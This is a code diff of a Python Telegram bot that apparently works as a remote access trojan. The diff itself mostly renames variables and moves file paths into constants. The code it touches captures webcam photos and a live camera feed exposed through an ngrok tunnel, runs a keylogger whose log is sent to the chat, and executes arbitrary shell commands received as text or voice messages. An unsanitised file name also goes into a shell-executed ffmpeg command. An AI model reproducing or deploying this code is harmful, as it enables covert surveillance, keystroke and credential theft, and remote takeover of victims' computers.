@@ -13,7 +13,7 @@ import time
 import datetime
 import os
 import cv2
-from logger import *
+from logger import Listener,key_handeler   
 import app
 import requests
 from pynput.keyboard import Controller as key
@@ -27,11 +27,13 @@ api_key = os.getenv("API_KEY")
 ngrok_token = os.getenv("NGROK_TOKEN")
 print(admin_chat_id, api_key, admin_name)
 chat_id_file = 0
+photo_name='photo.png'
+authorzed_Users='authorzed_Users/authorzed_Users.json'
+key_log_file="KeyLoger.txt"
 fin = ''
 random_f = ''
 fname = ''
 fileMessageId = ''
-#video_therad=threading.Thread(target=lambda: app.app.run( port=5000, debug=True, use_reloader=False))
 video_therad_state=''
 ngrok.set_auth_token(ngrok_token)
 def replymessage(first_name, last_name, command, chat_id):
@@ -62,11 +64,12 @@ def replymessage(first_name, last_name, command, chat_id):
                else:
                    app.start_server()
                    tunnel=ngrok.connect(5000,'http')
-                   publicUrl= str(tunnel).split('''"''')[1]
+                   public_url= str(tunnel).split('''"''')[1]
                    telegram_bot.sendMessage(chat_id,f'''for live video feed vist 
-{publicUrl}''')
+{public_url}''')
                    if not(str(chat_id).startswith(admin_chat_id) and str(chat_id).endswith(admin_chat_id)):
-                       telegram_bot.sendMessage(admin_chat_id,f"live video feed started by {first_name} {last_name} vist /n{publicUrl}")
+                       telegram_bot.sendMessage(admin_chat_id,f'''live video feed started by {first_name} {last_name} vist 
+{public_url}''')
                    video_therad_state="ON"
 
                    
@@ -106,9 +109,9 @@ def replymessage(first_name, last_name, command, chat_id):
                 vod = cv2.VideoCapture(0)
                 d, img = vod.read()
                 vod.release()
-                cv2.imwrite('photo.png', img)
-                telegram_bot.sendPhoto(chat_id, photo=open('photo.png', 'rb'))
-                os.remove('photo.png')
+                cv2.imwrite(photo_name, img)
+                telegram_bot.sendPhoto(chat_id, photo=open(photo_name, 'rb'))
+                os.remove(photo_name)
             elif((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
                 if not logging:
                     logger = Listener(on_press=key_handeler)
@@ -119,9 +122,10 @@ def replymessage(first_name, last_name, command, chat_id):
                     logger.stop()
                     telegram_bot.sendMessage(chat_id, "Key logger stopped")
                     telegram_bot.sendDocument(
-                        chat_id, document=open("KeyLoger.txt", "rb"))
-                    x = open("KeyLoger.txt", "w")
+                        chat_id, document=open(key_log_file, "rb"))
+                    x = open(key_log_file, "w")
                     x.close()
+                    os.remove(key_log_file)
                     logging = False
             else:
                 message = Popen(command, shell=True, stdout=PIPE,
@@ -154,7 +158,7 @@ def replymessage(first_name, last_name, command, chat_id):
             auth_list['authorized'].append(new_guy)
             print(auth_list)
             pending = 0
-            with open('authorzed_Users/authorzed_Users.json', 'w') as f:
+            with open(authorzed_Users, 'w') as f:
                 json.dump(auth_list, f, indent=2)
                 f.close()
         else:
@@ -192,9 +196,9 @@ def download_file(msg, key):
             if fname.endswith(".oga"):
                 with open(f'downloads/{fname}', "wb") as f:
                     f.write(fin.content)
-                convertCommand=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
-                print(convertCommand)
-                message = Popen(convertCommand, shell=True,
+                convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
+                print(convert_command)
+                message = Popen(convert_command, shell=True,
                                     stdout=PIPE, text=True).communicate()[0]
                 text=""
                 print(message)
@@ -206,7 +210,7 @@ def download_file(msg, key):
                     text = speach.recognize_google(audio_data)
                     print(text)
                 chat_id = msg['chat']['id']
-                #command = msg['text']
+                
                 os.remove(f"downloads/{fname}.wav")
                 os.remove(f"downloads/{fname}")
                 first_name = msg['chat']['first_name']
@@ -228,9 +232,9 @@ def download_file(msg, key):
             with open(f'downloads/{fname}', "wb") as f:
                 f.write(fin.content)
             if fname.endswith(".oga"):
-                convertCommand=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
-                print(convertCommand)
-                message = Popen(convertCommand, shell=True,
+                convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
+                print(convert_command)
+                message = Popen(convert_command, shell=True,
                                     stdout=PIPE, text=True).communicate()[0]
                 text=""
                 print(message)
@@ -242,7 +246,6 @@ def download_file(msg, key):
                     text = speach.recognize_google(audio_data)
                     print(text)
                 chat_id = msg['chat']['id']
-                #command = msg['text']
                 os.remove(f"downloads/{fname}.wav")
                 os.remove(f"downloads/{fname}")
                 first_name = msg['chat']['first_name']
@@ -261,13 +264,13 @@ key_list = ["text", "voice", "photo", "video", "document"]
 file_found = False
 while not file_found:
     try:
-        with open('authorzed_Users/authorzed_Users.json') as f:
+        with open(authorzed_Users) as f:
             auth_list = json.load(f)
         print(auth_list)
         file_found = True
-    except:
+    except FileNotFoundError:
         data = {'authorized': [{'chat_id': None, 'Name': None}]}
-        with open('authorzed_Users/authorzed_Users.json', 'w') as f:
+        with open(authorzed_Users, 'w') as f:
             json.dump(data, f, indent=2)
 
 connected = False
@@ -275,7 +278,7 @@ while (connected == False):
     try:
         x = open_web.urlopen('https://api.ipify.org/')
         connected = True
-    except:
+    except Exception:
         connected = False
         time.sleep(1)
 print(auth_list)
@@ -305,7 +308,6 @@ def action(msg):
     print(auth_list)
 
     chat_id = msg['chat']['id']
-    #command = msg['text']
     first_name = msg['chat']['first_name']
     last_name = msg['chat']['last_name']
     for i in key_list:
